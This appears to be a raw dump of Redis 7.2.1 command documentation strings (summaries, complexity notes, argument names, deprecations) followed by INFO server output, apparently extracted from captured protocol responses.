+Restores all libraries from a payload.
+complexity
+O(N) where N is the number of functions on the payload
+serialized-value
+display_text
+serialized-value
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+function|load
+Creates a library.
+complexity
+O(1) (considering compilation time is redundant)
+pure-token
+display_text
+function-code
+display_text
+function-code
+function|list
+Returns information about all libraries.
+complexity
+O(N) where N is the number of functions
+library-name-pattern
+display_text
+library-name-pattern
+LIBRARYNAME
+pure-token
+display_text
+function|dump
+Dumps all libraries into a serialized binary payload.
+complexity
+O(N) where N is the number of functions
+function|help
+Returns helpful text about the different subcommands.
+complexity
+function|kill
+Terminates a function during execution.
+complexity
+function|stats
+Returns information about a function during execution.
+complexity
+Returns the score of a member in a sorted set.
+sorted-set
+complexity
+display_text
+key_spec_index
+display_text
+An internal command for configuring the replication stream.
+complexity
+Discards a transaction.
+transactions
+complexity
+O(N), when N is the number of queued commands
+sunionstore
+Stores the union of multiple sets in a key.
+complexity
+O(N) where N is the total number of elements in all given sets.
+destination
+display_text
+destination
+key_spec_index
+display_text
+key_spec_index
+Returns the index of matching elements in a list.
+complexity
+O(N) where N is the number of elements in the list, for the average case. When searching for elements near the head or the tail of the list, or when the MAXLEN option is provided, the command may run in constant time.
+display_text
+key_spec_index
+display_text
+display_text
+num-matches
+display_text
+num-matches
+display_text
+Moves a key to another database.
+complexity
+display_text
+key_spec_index
+display_text
+Prepends one or more elements to a list only when the list exists.
+complexity
+O(1) for each element added, so O(N) to add N elements when the command is called with multiple arguments.
+Accepts multiple `element` arguments.
+display_text
+key_spec_index
+display_text
+Remove all keys from the current database.
+complexity
+O(N) where N is the number of keys in the selected database
+Added the `ASYNC` flushing mode modifier.
+Added the `SYNC` flushing mode modifier.
+flush-type
+pure-token
+display_text
+pure-token
+display_text
+zrangebyscore
+Returns members in a sorted set within a range of scores.
+sorted-set
+complexity
+O(log(N)+M) with N being the number of elements in the sorted set and M the number of elements being returned. If M is constant (e.g. always asking for the first 10 elements with LIMIT), you can consider it O(log(N)).
++deprecated
+deprecated_since
+replaced_by
+`ZRANGE` with the `BYSCORE` argument
+Added the `WITHSCORES` modifier.
+display_text
+key_spec_index
+display_text
+display_text
+withscores
+pure-token
+display_text
+withscores
+WITHSCORES
+display_text
+display_text
+Returns the difference of multiple sets.
+complexity
+O(N) where N is the total number of elements in all given sets.
+display_text
+key_spec_index
+Sorts the elements in a list, a set, or a sorted set, optionally storing the result.
+complexity
+O(N+M*log(M)) where N is the number of elements in the list or set to sort, and M the number of returned elements. When the elements are not sorted, complexity is O(N).
+display_text
+key_spec_index
+by-pattern
+display_text
+key_spec_index
+display_text
+display_text
+get-pattern
+display_text
+key_spec_index
++multiple_token
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+destination
+display_text
+destination
+key_spec_index
+Removes one or more members from a sorted set. Deletes the sorted set if all members were removed.
+sorted-set
+complexity
+O(M*log(N)) with N being the number of elements in the sorted set and M the number of elements to be removed.
+Accepts multiple elements.
+display_text
+key_spec_index
+display_text
+Returns the number of members in a set.
+complexity
+display_text
+key_spec_index
+zremrangebyscore
+Removes members in a sorted set within a range of scores. Deletes the sorted set if all members were removed.
+sorted-set
+complexity
+O(log(N)+M) with N being the number of elements in the sorted set and M the number of elements removed by the operation.
+display_text
+key_spec_index
+display_text
+display_text
+Returns the replication role.
+complexity
+psubscribe
+Listens for messages published to channels that match one or more patterns.
+complexity
+O(N) where N is the number of patterns to subscribe to.
+display_text
+pexpiretime
+Returns the expiration time of a key as a Unix milliseconds timestamp.
+complexity
+display_text
+key_spec_index
+Removes the expiration time of a key.
+complexity
+display_text
+key_spec_index
+An internal command used in replication.
+replicationid
+display_text
+replicationid
+display_text
+Listens for all requests received by the server in real-time.
+Atomically transfers a key from one Redis instance to another.
+complexity
+This command actually executes a DUMP+DEL in the source instance, and a RESTORE in the target instance. See the pages of these commands for time complexity. Also an O(N) data transfer between the two instances is performed.
+Added the `COPY` and `REPLACE` options.
+Added the `KEYS` option.
+Added the `AUTH` option.
+Added the `AUTH2` option.
+display_text
+display_text
+key-selector
+display_text
+key_spec_index
+empty-string
+pure-token
+display_text
+empty-string
+destination-db
+display_text
+destination-db
+display_text
+pure-token
+display_text
+pure-token
+display_text
+authentication
+display_text
+display_text
+display_text
+display_text
+key_spec_index
+A container for memory diagnostics commands.
+complexity
+Depends on subcommand.
+subcommands
+memory|doctor
+Outputs a memory problems report.
+complexity
+memory|help
+Returns helpful text about the different subcommands.
+complexity
+memory|stats
+Returns details about memory usage.
+complexity
+memory|usage
+Estimates the memory usage of a key.
+complexity
+O(N) where N is the number of samples.
+display_text
+key_spec_index
+display_text
+memory|malloc-stats
+Returns the allocator statistics.
+complexity
+Depends on how much memory is allocated, could be slow
+memory|purge
+Asks the allocator to release memory.
+complexity
+Depends on how much memory is allocated, could be slow
+Creates a key from the serialized representation of a value.
+complexity
+O(1) to create the new key and additional O(N*M) to reconstruct the serialized value, where N is the number of Redis objects composing the value and M their average size. For small string values the time complexity is thus O(1)+O(1*M) where M is small, so simply O(1). However for sorted set values the complexity is O(N*M*log(N)) because inserting values into sorted sets is O(log(N)).
+Added the `REPLACE` modifier.
+Added the `ABSTTL` modifier.
+Added the `IDLETIME` and `FREQ` options.
+display_text
+key_spec_index
+display_text
+serialized-value
+display_text
+serialized-value
+pure-token
+display_text
+pure-token
+display_text
+display_text
+display_text
+Returns all members of a set.
+complexity
+O(N) where N is the set cardinality.
+display_text
+key_spec_index
+Sets or clears the bit at offset of the string value. Creates the key if it doesn't exist.
+complexity
+display_text
+key_spec_index
+display_text
+display_text
+Prepends one or more elements to a list. Creates the key if it doesn't exist.
+complexity
+O(1) for each element added, so O(N) to add N elements when the command is called with multiple arguments.
+Accepts multiple `element` arguments.
+display_text
+key_spec_index
+display_text
+hrandfield
+Returns one or more random fields from a hash.
+complexity
+O(N) where N is the number of fields returned
+display_text
+key_spec_index
+display_text
+withvalues
+pure-token
+display_text
+withvalues
+WITHVALUES
+A container for module commands.
+complexity
+Depends on subcommand.
+subcommands
+module|loadex
+Loads a module using extended parameters.
+complexity
+display_text
++multiple_token
+display_text
+display_text
+display_text
+module|load
+Loads a module.
+complexity
+display_text
+display_text
+module|list
+Returns all loaded modules.
+complexity
+O(N) where N is the number of loaded modules.
+module|help
+Returns helpful text about the different subcommands.
+complexity
+module|unload
+Unloads a module.
+complexity
+display_text
+Authenticates the connection.
+connection
+complexity
+O(N) where N is the number of passwords defined for the user
+Added ACL style (username and password).
+display_text
+display_text
+Invokes a function.
+complexity
+Depends on the function that is executed.
+display_text
+display_text
+display_text
+key_spec_index
+display_text
+A container for debugging commands.
+complexity
+Depends on subcommand.
+Returns the number of members in a sorted set.
+sorted-set
+complexity
+display_text
+key_spec_index
+Removes and returns the first element in a list. Blocks until an element is available otherwise. Deletes the list if the last element was popped.
+complexity
+O(N) where N is the number of provided keys.
+`timeout` is interpreted as a double instead of an integer.
+display_text
+key_spec_index
+display_text
+Returns the count of members in a sorted set that have scores within a range.
+sorted-set
+complexity
+O(log(N)) with N being the number of elements in the sorted set.
+display_text
+key_spec_index
+display_text
+display_text
+Returns the server time.
+complexity
+srandmember
+Get one or multiple random members from a set
+complexity
+Without the count argument O(1), otherwise O(N) where N is the absolute value of the passed count.
+Added the optional `count` argument.
+display_text
+key_spec_index
+display_text
+Determines the type of value stored at a key.
+complexity
+display_text
+key_spec_index
+Signals that a cluster client is following an -ASK redirect.
+complexity
+Displays computer art and the Redis version
+display_text
+Returns the highest-scoring members from a sorted set after removing them. Deletes the sorted set if the last member was popped.
+sorted-set
+complexity
+O(log(N)*M) with N being the number of elements in the sorted set, and M being the number of elements popped.
+display_text
+key_spec_index
+display_text
+Returns the intersect of multiple sets.
+complexity
+O(N*M) worst case where N is the cardinality of the smallest set and M is the number of sets.
+display_text
+key_spec_index
+Sets the values of multiple fields.
+complexity
+O(N) where N is the number of fields being set.
++deprecated
+deprecated_since
+replaced_by
+`HSET` with multiple field-value pairs
+display_text
+key_spec_index
+display_text
+display_text
+Handshakes with the Redis server.
+connection
+complexity
+`protover` made optional; when called without arguments the command reports the current connection's context.
+display_text
+display_text
+display_text
+clientname
+display_text
+clientname
+Blocks until all of the preceding write commands sent by the connection are written to the append-only file of the master and/or replicas.
+complexity
+display_text
+numreplicas
+display_text
+numreplicas
+display_text
+Closes the connection.
+connection
+complexity
++deprecated
+deprecated_since
+replaced_by
+just closing the connection
+Resets the connection.
+connection
+complexity
+Returns the difference between multiple sorted sets.
+sorted-set
+complexity
+O(L + (N-K)log(N)) worst case where L is the total number of elements in all the sets, N is the size of the first set, and K is the size of the result set.
+display_text
+display_text
+key_spec_index
+withscores
+pure-token
+display_text
+withscores
+WITHSCORES
+Adds elements to a HyperLogLog key. Creates the key if it doesn't exist.
+hyperloglog
+complexity
+O(1) to add every element.
+display_text
+key_spec_index
+display_text
+Determines whether a member belongs to a set.
+complexity
+display_text
+key_spec_index
+display_text
+Deletes one or more fields and their values from a hash. Deletes the hash if no fields remain.
+complexity
+O(N) where N is the number of fields to be removed.
+Accepts multiple `field` arguments.
+display_text
+key_spec_index
+display_text
+Returns the index of a member in a sorted set ordered by ascending scores.
+sorted-set
+complexity
+Added the optional `WITHSCORE` argument.
+display_text
+key_spec_index
+display_text
+pure-token
+display_text
+Returns an element from a list by its index.
+complexity
+O(N) where N is the number of elements to traverse to get to the element at index. This makes asking for the first or the last element of the list O(1).
+display_text
+key_spec_index
+display_text
+Returns the longitude and latitude of members from a geospatial index.
+complexity
+O(1) for each member requested.
+display_text
+key_spec_index
+display_text
+Renames a key only when the target key name doesn't exist.
+complexity
+The command no longer returns an error when source and destination names are the same.
+display_text
+key_spec_index
+display_text
+key_spec_index
+Returns the last element of a list after removing and pushing it to another list. Deletes the list if the last element was popped.
+complexity
++deprecated
+deprecated_since
+replaced_by
+`LMOVE` with the `RIGHT` and `LEFT` arguments
+display_text
+key_spec_index
+destination
+display_text
+destination
+key_spec_index
+Returns the score of one or more members in a sorted set.
+sorted-set
+complexity
+O(N) where N is the number of members being requested.
+display_text
+key_spec_index
+display_text
+Removes and returns a member by score from one or more sorted sets. Blocks until a member is available otherwise. Deletes the sorted set if the last element was popped.
+sorted-set
+complexity
+O(K) + O(M*log(N)) where K is the number of provided keys, N being the number of elements in the sorted set, and M being the number of elements popped.
+display_text
+display_text
+display_text
+key_spec_index
+pure-token
+display_text
+pure-token
+display_text
+display_text
+Sets the string value of a key, ignoring its type. The key is created if it doesn't exist.
+complexity
+Added the `EX`, `PX`, `NX` and `XX` options.
+Added the `KEEPTTL` option.
+Added the `GET`, `EXAT` and `PXAT` option.
+Allowed the `NX` and `GET` options to be used together.
+display_text
+key_spec_index
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+expiration
+display_text
+milliseconds
+display_text
+milliseconds
+unix-time-seconds
+display_text
+unix-time-seconds
+unix-time-milliseconds
+display_text
+unix-time-milliseconds
+pure-token
+display_text
+Returns the string value of a key.
+complexity
+display_text
+key_spec_index
+georadius_ro
+Returns members from a geospatial index that are within a distance from a coordinate.
+complexity
+O(N+log(M)) where N is the number of elements inside the bounding box of the circular area delimited by center and radius and M is the number of items inside the index.
++deprecated
+deprecated_since
+replaced_by
+`GEOSEARCH` with the `BYRADIUS` argument
+Added the `ANY` option for `COUNT`.
+display_text
+key_spec_index
+display_text
+display_text
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+count-block
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+Returns an element after popping it from one list and pushing it to another. Deletes the list if the last element was moved.
+complexity
+display_text
+key_spec_index
+destination
+display_text
+destination
+key_spec_index
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+georadiusbymember
+Queries a geospatial index for members within a distance from a member, optionally stores the result.
+complexity
+O(N+log(M)) where N is the number of elements inside the bounding box of the circular area delimited by center and radius and M is the number of items inside the index.
++deprecated
+deprecated_since
+replaced_by
+`GEOSEARCH` and `GEOSEARCHSTORE` with the `BYRADIUS` and `FROMMEMBER` arguments
+Added support for uppercase unit names.
+display_text
+key_spec_index
+display_text
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+count-block
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+display_text
+key_spec_index
+storedistkey
+display_text
+key_spec_index
+Returns one or more random members from a set after removing them. Deletes the set if the last member was popped.
+complexity
+Without the count argument O(1), otherwise O(N) where N is the value of the passed count.
+Added the `count` argument.
+display_text
+key_spec_index
+display_text
+A container for latency diagnostics commands.
+complexity
+Depends on subcommand.
+subcommands
+latency|reset
+Resets the latency data for one or more events.
+complexity
+display_text
+latency|doctor
+Returns a human-readable latency analysis report.
+complexity
+latency|histogram
+Returns the cumulative distribution of latencies of a subset or all commands.
+complexity
+O(N) where N is the number of commands with latency information being retrieved.
+display_text
+latency|latest
+Returns the latest latency samples for all events.
+complexity
+latency|graph
+Returns a latency graph for an event.
+complexity
+display_text
+latency|help
+Returns helpful text about the different subcommands.
+complexity
+latency|history
+Returns timestamp-latency samples for an event.
+complexity
+display_text
+Returns the intersect of multiple sorted sets.
+sorted-set
+complexity
+O(N*K)+O(M*log(M)) worst case with N being the smallest input sorted set, K being the number of input sorted sets and M being the number of elements in the resulting sorted set.
+display_text
+display_text
+key_spec_index
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+withscores
+pure-token
+display_text
+withscores
+WITHSCORES
+Returns the value of a field in a hash.
+complexity
+display_text
+key_spec_index
+display_text
+Increments the integer value of a key by one. Uses 0 as initial value if the key doesn't exist.
+complexity
+display_text
+key_spec_index
+Executes a server-side Lua script.
+complexity
+Depends on the script that is executed.
+display_text
+display_text
+display_text
+key_spec_index
+display_text
+Starts a transaction.
+transactions
+complexity
+Finds the first set (1) or clear (0) bit in a string.
+complexity
+Added the `BYTE|BIT` option.
+display_text
+key_spec_index
+display_text
+display_text
+end-unit-block
+display_text
+pure-token
+display_text
+pure-token
+display_text
+Returns a substring of the string stored at a key.
+complexity
+O(N) where N is the length of the returned string. The complexity is ultimately determined by the returned length, but because creating a substring from an existing string is very cheap, it can be considered O(1) for small strings.
+display_text
+key_spec_index
+display_text
+display_text
+A container for slow log commands.
+complexity
+Depends on subcommand.
+subcommands
+slowlog|reset
+Clears all entries from the slow log.
+complexity
+O(N) where N is the number of entries in the slowlog
+slowlog|get
+Returns the slow log's entries.
+complexity
+O(N) where N is the number of entries returned
+Added client IP address, port and name to the reply.
+display_text
+slowlog|len
+Returns the number of entries in the slow log.
+complexity
+slowlog|help
+Show helpful text about the different subcommands
+complexity
+Returns the messages from a stream within a range of IDs in reverse order.
+complexity
+O(N) with N being the number of elements returned. If N is constant (e.g. always asking for the first 10 elements with COUNT), you can consider it O(1).
+Added exclusive ranges.
+display_text
+key_spec_index
+display_text
+display_text
+display_text
+Returns the previous string value of a key after setting it to a new value.
+complexity
++deprecated
+deprecated_since
+replaced_by
+`SET` with the `!GET` argument
+display_text
+key_spec_index
+display_text
+Returns the union of multiple sorted sets.
+sorted-set
+complexity
+O(N)+O(M*log(M)) with N being the sum of the sizes of the input sorted sets, and M being the number of elements in the resulting sorted set.
+display_text
+display_text
+key_spec_index
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+withscores
+pure-token
+display_text
+withscores
+WITHSCORES
+incrbyfloat
+Increment the floating point value of a key by a number. Uses 0 as initial value if the key doesn't exist.
+complexity
+display_text
+key_spec_index
+display_text
+Returns the length of a string value.
+complexity
+display_text
+key_spec_index
+Returns a serialized representation of the value stored at a key.
+complexity
+O(1) to access the key and additional O(N*M) to serialize it, where N is the number of Redis objects composing the value and M their average size. For small string values the time complexity is thus O(1)+O(1*M) where M is small, so simply O(1).
+display_text
+key_spec_index
+pfselftest
+An internal command for testing HyperLogLog values.
+hyperloglog
+complexity
+Appends a string to the value of a key. Creates the key if it doesn't exist.
+complexity
+O(1). The amortized time complexity is O(1) assuming the appended value is small and the alr
+~eady present value is of any size, since the dynamic string library used by Redis will double the free space available on every reallocation.
+display_text
+key_spec_index
+display_text
+A container for object introspection commands.
+complexity
+Depends on subcommand.
+subcommands
+object|idletime
+Returns the time since the last access to a Redis object.
+complexity
+display_text
+key_spec_index
+object|freq
+Returns the logarithmic access frequency counter of a Redis object.
+complexity
+display_text
+key_spec_index
+object|encoding
+Returns the internal encoding of a Redis object.
+complexity
+display_text
+key_spec_index
+object|help
+Returns helpful text about the different subcommands.
+complexity
+object|refcount
+Returns the reference count of a value of a key.
+complexity
+display_text
+key_spec_index
+Returns the number of members in a sorted set within a lexicographical range.
+sorted-set
+complexity
+O(log(N)) with N being the number of elements in the sorted set.
+display_text
+key_spec_index
+display_text
+display_text
+Queries a geospatial index for members within a distance from a coordinate, optionally stores the result.
+complexity
+O(N+log(M)) where N is the number of elements inside the bounding box of the circular area delimited by center and radius and M is the number of items inside the index.
++deprecated
+deprecated_since
+replaced_by
+`GEOSEARCH` and `GEOSEARCHSTORE` with the `BYRADIUS` argument
+Added the `ANY` option for `COUNT`.
+Added support for uppercase unit names.
+display_text
+key_spec_index
+display_text
+display_text
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+count-block
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+display_text
+key_spec_index
+storedistkey
+display_text
+key_spec_index
+Returns the first elements in a list after removing it. Deletes the list if the last element was popped.
+complexity
+O(N) where N is the number of elements returned
+Added the `count` argument.
+display_text
+key_spec_index
+display_text
+Appends an element to a list only when the list exists.
+complexity
+O(1) for each element added, so O(N) to add N elements when the command is called with multiple arguments.
+Accepts multiple `element` arguments.
+display_text
+key_spec_index
+display_text
+Atomically creates or modifies the string values of one or more keys.
+complexity
+O(N) where N is the number of keys to set.
+display_text
+key_spec_index
+display_text
+Listens for messages published to channels.
+complexity
+O(N) where N is the number of channels to subscribe to.
+display_text
+Sets both string value and expiration time in milliseconds of a key. The key is created if it doesn't exist.
+complexity
++deprecated
+deprecated_since
+replaced_by
+`SET` with the `PX` argument
+display_text
+key_spec_index
+milliseconds
+display_text
+milliseconds
+display_text
+A container for consumer groups commands.
+complexity
+Depends on subcommand.
+subcommands
+xgroup|createconsumer
+Creates a consumer in a consumer group.
+complexity
+display_text
+key_spec_index
+display_text
+display_text
+xgroup|destroy
+Destroys a consumer group.
+complexity
+O(N) where N is the number of entries in the group's pending entries list (PEL).
+display_text
+key_spec_index
+display_text
+xgroup|setid
+Sets the last-delivered ID of a consumer group.
+complexity
+Added the optional `entries_read` argument.
+display_text
+key_spec_index
+display_text
+id-selector
+display_text
+pure-token
+display_text
+entriesread
+display_text
+entries-read
+ENTRIESREAD
+xgroup|create
+Creates a consumer group.
+complexity
+Added the `entries_read` named argument.
+display_text
+key_spec_index
+display_text
+id-selector
+display_text
+pure-token
+display_text
+pure-token
+display_text
+entries-read
+display_text
+entries-read
+ENTRIESREAD
+xgroup|delconsumer
+Deletes a consumer from a consumer group.
+complexity
+display_text
+key_spec_index
+display_text
+display_text
+xgroup|help
+Returns helpful text about the different subcommands.
+complexity
+zrevrangebylex
+Returns members in a sorted set within a lexicographical range in reverse order.
+sorted-set
+complexity
+O(log(N)+M) with N being the number of elements in the sorted set and M the number of elements being returned. If M is constant (e.g. always asking for the first 10 elements with LIMIT), you can consider it O(log(N)).
++deprecated
+deprecated_since
+replaced_by
+`ZRANGE` with the `REV` and `BYLEX` arguments
+display_text
+key_spec_index
+display_text
+display_text
+display_text
+display_text
+bitfield_ro
+Performs arbitrary read-only bitfield integer operations on strings.
+complexity
+O(1) for each subcommand specified
+display_text
+key_spec_index
++multiple_token
+display_text
+display_text
+Performs arbitrary bitfield integer operations on strings.
+complexity
+O(1) for each subcommand specified
+display_text
+key_spec_index
+display_text
+display_text
+overflow-block
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+write-operation
+display_text
+display_text
+display_text
+incrby-block
+display_text
+display_text
+display_text
+Invokes a read-only function.
+complexity
+Depends on the function that is executed.
+display_text
+display_text
+display_text
+key_spec_index
+display_text
+Returns the approximated cardinality of the set(s) observed by the HyperLogLog key(s).
+hyperloglog
+complexity
+O(1) with a very small average constant time when called with a single key. O(N) with N being the number of keys, and much bigger constant times, when called with multiple keys.
+display_text
+key_spec_index
+Returns all fields and values in a hash.
+complexity
+O(N) where N is the size of the hash.
+display_text
+key_spec_index
+Returns members in a sorted set within a range of indexes in reverse order.
+sorted-set
+complexity
+O(log(N)+M) with N being the number of elements in the sorted set and M the number of elements returned.
++deprecated
+deprecated_since
+replaced_by
+`ZRANGE` with the `REV` argument
+display_text
+key_spec_index
+display_text
+display_text
+withscores
+pure-token
+display_text
+withscores
+WITHSCORES
+Returns members in a sorted set within a range of indexes.
+sorted-set
+complexity
+O(log(N)+M) with N being the number of elements in the sorted set and M the number of elements returned.
+Added the `REV`, `BYSCORE`, `BYLEX` and `LIMIT` options.
+display_text
+key_spec_index
+display_text
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+display_text
+display_text
+withscores
+pure-token
+display_text
+withscores
+WITHSCORES
+Removes and returns the member with the lowest score from one or more sorted sets. Blocks until a member is available otherwise. Deletes the sorted set if the last element was popped.
+sorted-set
+complexity
+O(log(N)) with N being the number of elements in the sorted set.
+`timeout` is interpreted as a double instead of an integer.
+display_text
+key_spec_index
+display_text
+sinterstore
+Stores the intersect of multiple sets in a key.
+complexity
+O(N*M) worst case where N is the cardinality of the smallest set and M is the number of sets.
+destination
+display_text
+destination
+key_spec_index
+display_text
+key_spec_index
+xreadgroup
+Returns new or historical messages from a stream for a consumer in a group. Blocks until a message is available otherwise.
+complexity
+For each stream mentioned: O(M) with M being the number of elements returned. If M is constant (e.g. always asking for the first 10 elements with COUNT), you can consider it O(1). On the other side when XREADGROUP blocks, XADD will pay the O(N) time in order to serve the N clients blocked on the stream getting new data.
+group-block
+display_text
+display_text
+display_text
+milliseconds
+display_text
+milliseconds
+pure-token
+display_text
+display_text
+key_spec_index
+display_text
+Returns messages from multiple streams with IDs greater than the ones requested. Blocks until a message is available otherwise.
+display_text
+milliseconds
+display_text
+milliseconds
+display_text
+key_spec_index
+display_text
+Sets the value of a field in a hash only when the field doesn't exist.
+complexity
+display_text
+key_spec_index
+display_text
+display_text
+Atomically returns the string values of one or more keys.
+complexity
+O(N) where N is the number of keys to retrieve.
+display_text
+key_spec_index
+Iterates over members and scores of a sorted set.
+sorted-set
+complexity
+O(1) for every call. O(N) for a complete iteration, including enough command calls for the cursor to return back to 0. N is the number of elements inside the collection.
+display_text
+key_spec_index
+display_text
+display_text
+display_text
+Adds one or more members to a sorted set, or updates their scores. Creates the key if it doesn't exist.
+sorted-set
+complexity
+O(log(N)) for each item added, where N is the number of elements in the sorted set.
+Accepts multiple elements.
+Added the `XX`, `NX`, `CH` and `INCR` options.
+Added the `GT` and `LT` options.
+display_text
+key_spec_index
+pure-token
+display_text
+pure-token
+display_text
+comparison
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+display_text
+display_text
+Returns all values in a hash.
+complexity
+O(N) where N is the size of the hash.
+display_text
+key_spec_index
+Appends one or more elements to a list. Creates the key if it doesn't exist.
+complexity
+O(1) for each element added, so O(N) to add N elements when the command is called with multiple arguments.
+Accepts multiple `element` arguments.
+display_text
+key_spec_index
+display_text
+Return the number of messages in a stream.
+complexity
+display_text
+key_spec_index
+A container for stream introspection commands.
+complexity
+Depends on subcommand.
+subcommands
+xinfo|stream
+Returns information about a stream.
+complexity
+Added the `FULL` modifier.
+Added the `max-deleted-entry-id`, `entries-added`, `recorded-first-entry-id`, `entries-read` and `lag` fields
+Added the `active-time` field, and changed the meaning of `seen-time`.
+display_text
+key_spec_index
+full-block
+pure-token
+display_text
+display_text
+xinfo|groups
+Returns a list of the consumer groups of a stream.
+complexity
+Added the `entries-read` and `lag` fields
+display_text
+key_spec_index
+xinfo|help
+Returns helpful text about the different subcommands.
+complexity
+xinfo|consumers
+Returns a list of the consumers in a consumer group.
+complexity
+Added the `inactive` field.
+display_text
+key_spec_index
+display_text
+Returns the expiration time in milliseconds of a key.
+complexity
+Added the -2 reply.
+display_text
+key_spec_index
+Sets the expiration time of a key in milliseconds.
+complexity
+Added options: `NX`, `XX`, `GT` and `LT`.
+display_text
+key_spec_index
+milliseconds
+display_text
+milliseconds
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+sintercard
+Returns the number of members of the intersect of multiple sets.
+complexity
+O(N*M) worst case where N is the cardinality of the smallest set and M is the number of sets.
+display_text
+display_text
+key_spec_index
+display_text
+A container for Redis Cluster commands.
+complexity
+Depends on subcommand.
+subcommands
+cluster|keyslot
+Returns the hash slot for a key.
+complexity
+O(N) where N is the number of bytes in the key
+display_text
+cluster|getkeysinslot
+Returns the key names in a hash slot.
+complexity
+O(N) where N is the number of requested keys
+display_text
+display_text
+cluster|setslot
+Binds a hash slot to a node.
+complexity
+display_text
+subcommand
+display_text
+display_text
+display_text
+pure-token
+display_text
+cluster|bumpepoch
+Advances the cluster config epoch.
+complexity
+cluster|delslotsrange
+Sets hash slot ranges as unbound for a node.
+complexity
+O(N) where N is the total number of the slots between the start slot and end slot arguments.
+start-slot
+display_text
+start-slot
+display_text
+cluster|addslots
+Assigns new hash slots to a node.
+complexity
+O(N) where N is the total number of hash slot arguments
+display_text
+cluster|count-failure-reports
+Returns the number of active failure reports active for a node.
+complexity
+O(N) where N is the number of failure reports
+display_text
+cluster|meet
+Forces a node to handshake with another node.
+complexity
+Added the optional `cluster_bus_port` argument.
+display_text
+display_text
+cluster-bus-port
+display_text
+cluster-bus-port
+cluster|shards
+Returns the mapping of cluster slots to shards.
+complexity
+O(N) where N is the total number of cluster nodes
+cluster|reset
+Resets a node.
+complexity
+O(N) where N is the number of known nodes. The command may execute a FLUSHALL as a side effect.
+reset-type
+pure-token
+display_text
+pure-token
+display_text
+cluster|set-config-epoch
+Sets the configuration epoch for a new node.
+complexity
+config-epoch
+display_text
+config-epoch
+cluster|countkeysinslot
+Returns the number of keys in a hash slot.
+complexity
+display_text
+cluster|links
+Returns a list of all TCP links to and from peer nodes.
+complexity
+O(N) where N is the total number of Cluster nodes
+cluster|myid
+Returns the ID of a node.
+complexity
+cluster|myshardid
+Returns the shard ID of a node.
+complexity
+cluster|flushslots
+Deletes all slots information from a node.
+complexity
+cluster|replicas
+Lists the replica nodes of a master node.
+complexity
+O(N) where N is the number of replicas.
+display_text
+cluster|addslotsrange
+Assigns new hash slot ranges to a node.
+complexity
+O(N) where N is the total number of the slots between the start slot and end slot arguments.
+start-slot
+display_text
+start-slot
+display_text
+cluster|nodes
+Returns the cluster configuration for a node.
+complexity
+O(N) where N is the total number of Cluster nodes
+cluster|slots
+Returns the mapping of cluster slots to nodes.
+complexity
+O(N) where N is the total number of Cluster nodes
++deprecated
+deprecated_since
+replaced_by
+`CLUSTER SHARDS`
+Added node IDs.
+Added additional networking metadata field.
+cluster|slaves
+Lists the replica nodes of a master node.
+complexity
+O(N) where N is the number of replicas.
++deprecated
+deprecated_since
+replaced_by
+`CLUSTER REPLICAS`
+display_text
+cluster|saveconfig
+Forces a node to save the cluster configuration to disk.
+complexity
+cluster|info
+Returns information about the state of a node.
+complexity
+cluster|forget
+Removes a node from the nodes table.
+complexity
+display_text
+cluster|failover
+Forces a replica to perform a manual failover of its master.
+complexity
+pure-token
+display_text
+pure-token
+display_text
+cluster|delslots
+Sets hash slots as unbound for a node.
+complexity
+O(N) where N is the total number of hash slot arguments
+display_text
+cluster|help
+Returns helpful text about the different subcommands.
+complexity
+cluster|replicate
+Configure a node as replica of a master node.
+complexity
+display_text
+Returns the string value of a key after setting its expiration time.
+complexity
+display_text
+key_spec_index
+expiration
+display_text
+milliseconds
+display_text
+milliseconds
+unix-time-seconds
+display_text
+unix-time-seconds
+unix-time-milliseconds
+display_text
+unix-time-milliseconds
+pure-token
+display_text
+Returns the server's liveliness response.
+connection
+complexity
+display_text
+Deletes messages from the beginning of a stream.
+complexity
+O(N), with N being the number of evicted entries. Constant times are very small however, since entries are organized in macro nodes containing multiple entries that can be released with a single deallocation.
+Added the `MINID` trimming strategy and the `LIMIT` option.
+display_text
+key_spec_index
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+approximately
+pure-token
+display_text
+approximately
+display_text
+display_text
+Appends a new message to a stream. Creates the key if it doesn't exist.
+complexity
+O(1) when adding a new entry, O(N) when trimming where N being the number of entries evicted.
+Added the `NOMKSTREAM` option, `MINID` trimming strategy and the `LIMIT` option.
+Added support for the `<ms>-*` explicit ID form.
+display_text
+key_spec_index
+nomkstream
+pure-token
+display_text
+nomkstream
+NOMKSTREAM
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+approximately
+pure-token
+display_text
+approximately
+display_text
+display_text
+id-selector
+pure-token
+display_text
+display_text
+display_text
+display_text
+redis_version:7.2.1
+redis_git_sha1:00000000
+redis_git_dirty:0
+redis_build_id:49be6daa683dbc39
+redis_mode:standalone
+os:Linux 5.15.0-88-generic x86_64
+arch_bits:64
+monotonic_clock:POSIX clock_gettime
+multiplexing_api:epoll
+atomicvar_api:c11-builtin
+gcc_version:12.2.1
+process_id:10
+process_supervised:no
+run_id:1587b109fdd6ea673b1ab78fdec3ce9a4be33dee
+tcp_port:6379
+server_time_usec:1699283478521182
